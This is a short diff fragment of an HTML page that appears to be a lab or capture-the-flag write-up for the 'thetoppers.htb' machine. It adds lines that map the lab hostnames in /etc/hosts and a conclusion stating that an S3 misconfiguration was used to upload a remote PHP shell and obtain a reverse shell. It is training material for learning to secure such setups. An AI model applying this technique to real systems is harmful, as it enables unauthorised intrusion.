+echo &quot;10.129.99.11 gc._msdcs.thetoppers.htb&quot; | sudo tee -a /etc/hosts  
+echo &quot;10.129.99.11 thetoppers.htb&quot; | sudo tee -a /etc/hosts  
+</code></pre>
 <hr />
 <h2 id="conclusion">Conclusion</h2>
-<p>SMB is a <strong>powerful network protocol</strong> for file sharing, but it also presents <strong>security risks</strong> when misconfigured. Understanding SMB enumeration techniques can help identify potential vulnerabilities and secure network resources.</p>
+<p>This attack leveraged <strong>Amazon S3 misconfigurations</strong> to upload a <strong>remote PHP shell</strong>, which was used to execute commands and gain a <strong>reverse shell</strong>. Proper <strong>S3 bucket permissions</strong> and <strong>server hardening</strong> can prevent such exploits.</p>
 
 
 
